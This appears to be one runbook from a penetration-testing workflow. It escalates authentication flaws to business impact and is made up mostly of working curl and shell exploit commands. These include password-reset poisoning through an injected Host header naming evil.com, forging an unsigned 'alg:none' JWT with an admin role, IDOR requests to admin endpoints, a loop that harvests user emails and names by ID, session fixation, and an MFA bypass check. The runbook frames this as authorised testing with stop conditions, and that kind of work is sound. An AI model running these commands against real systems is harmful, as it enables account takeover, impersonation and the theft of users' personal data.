# Auth Impact Escalation Runbook

## Purpose
Escalate from "auth mechanism is broken" to demonstrable business impact. SAFE commands only — no destructive account modifications, no accessing real user data beyond your own test accounts.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — `$OUTDIR/cookies.txt`
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/auth`

## Impact Categories

### I1 — Account Takeover via Password Reset
```bash
curl -sk -v "$TARGET_URL/forgot-password" -H "Host: evil.com" -d "email=admin@target.com" > "$EVIDENCE_DIR/impact-reset-hijack.txt" 2>&1
echo "Impact: Password reset link sent to attacker-controlled domain via Host header injection"
```

### I2 — Account Takeover via JWT Manipulation
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","email":"admin@target.com"}' | base64 | tr -d '=' | tr '/+' '_-')
TOKEN="${HEADER}.${PAYLOAD}."
curl -sk -v -H "Authorization: Bearer $TOKEN" "$TARGET_URL/api/me" -o "$EVIDENCE_DIR/impact-jwt-impersonate.txt" 2>"$EVIDENCE_DIR/impact-jwt-impersonate-headers.txt"
echo "Impact: Attacker can forge JWT tokens to impersonate any user including admin"
```

### I3 — Privilege Escalation via IDOR
```bash
curl -sk -b "$COOKIE_JAR" -o "$EVIDENCE_DIR/impact-idor-escalated.txt" -w "\nHTTP_CODE: %{http_code}\n" "$TARGET_URL/api/admin/users"
grep -qE 'HTTP_CODE: 200' "$EVIDENCE_DIR/impact-idor-escalated.txt" && echo "Impact: Low-privilege user can access admin endpoints" >> "$EVIDENCE_DIR/impact-log.txt"
```

### I4 — Session Hijacking via Fixation
```bash
curl -sk -c "$EVIDENCE_DIR/impact-fixed-session.txt" -o /dev/null "$TARGET_URL/login"
echo "Impact: Attacker pre-sets victim's session ID, then hijacks session after victim logs in"
echo "Impact: Session does not rotate on login, enabling session fixation attacks"
```

### I5 — Data Exposure via IDOR
```bash
for id in $(seq 1 10); do
  curl -sk -b "$COOKIE_JAR" -o "$EVIDENCE_DIR/impact-idor-user-$id.json" "$TARGET_URL/api/user/$id"
  python3 -c "import json; d=json.load(open('$EVIDENCE_DIR/impact-idor-user-$id.json')); print(f'User {id}: {d.get(\"email\",\"no email\")} - {d.get(\"name\",\"no name\")}')" 2>/dev/null
done >> "$EVIDENCE_DIR/impact-idor-dump.txt"
```

### I6 — MFA Bypass (full account compromise)
```bash
curl -sk -c "$EVIDENCE_DIR/impact-mfa-bypass-sess.txt" -d "username=$TEST_USER&password=$TEST_PASS" "$TARGET_URL/login" -o /dev/null
curl -sk -b "$EVIDENCE_DIR/impact-mfa-bypass-sess.txt" "$TARGET_URL/dashboard" -o "$EVIDENCE_DIR/impact-mfa-bypassed.txt"
grep -qiE 'dashboard|profile|account|settings' "$EVIDENCE_DIR/impact-mfa-bypassed.txt" && echo "Impact: MFA bypass — account accessible without second factor" >> "$EVIDENCE_DIR/impact-log.txt"
```

## What Impact Looks Like Per Sub-Type

| Sub-Type | Impact Signal | Severity |
|---|---|---|
| JWT alg:none | Impersonate any user, access protected APIs | Critical |
| JWT key confusion | Sign tokens for any user | Critical |
| Password reset Host injection | Steal reset tokens, ATO | Critical |
| Session fixation | Hijack victim session post-login | High |
| Session not revoked | Compromised session remains valid forever | Medium |
| MFA bypass | Bypass entire second-factor protection | High |
| IDOR | Access other users' private data | Medium-Critical |

## Stop Conditions
- Stop once account takeover is demonstrated
- Stop once privilege escalation is demonstrated
- Do NOT modify production database or real accounts
- Do NOT access data of real users (simulated enumeration via IDs is OK if IDs are sequential)

## Evidence for Report
- Screenshot of dashboard/profile accessed with forged token or session
- API response showing other user's data via IDOR
- Forged JWT token and response
- Password reset email with attacker-controlled domain in link

## Next Routing
- Impact demonstrated -> `runbooks/05-evidence-collection.md`
